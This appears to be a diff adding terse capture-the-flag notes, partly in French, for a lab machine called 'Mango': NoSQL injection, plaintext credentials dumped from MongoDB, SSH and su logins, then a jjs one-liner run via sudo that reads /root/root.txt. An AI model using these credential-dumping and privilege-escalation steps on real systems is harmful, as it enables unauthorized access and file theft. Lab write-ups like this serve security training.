@@ -1,0 +1,27 @@
+change /etc/hosts
+go to 
+http://staging-order.mango.htb/home.php
+
+Nosql found: utiliser le script python 
+username: mango 
+password: h3mXK8RhU~f{]f5H
+
+se log en ssh user a portee de main 
+
+mongodb access db : mongo 
+sur la db :
+> db.users.find()
+{ "_id" : ObjectId("5d8e25334f3bf1432628927b"), "username" : "admin", "password" : "t9KcS3>!0B#2" }
+{ "_id" : ObjectId("5d8e25364f3bf1432628927c"), "username" : "mango", "password" : "h3mXK8RhU~f{]f5H" }
+> 
+ 
+as mongo su admin password
+
+linpeas showed us that jjs can be run as sudo so gtfobins => 
+
+echo 'var BufferedReader = Java.type("java.io.BufferedReader");
+var FileReader = Java.type("java.io.FileReader");
+var br = new BufferedReader(new FileReader("/root/root.txt"));
+while ((line = br.readLine()) != null) { print(line); }' | jjs
+
+rooted
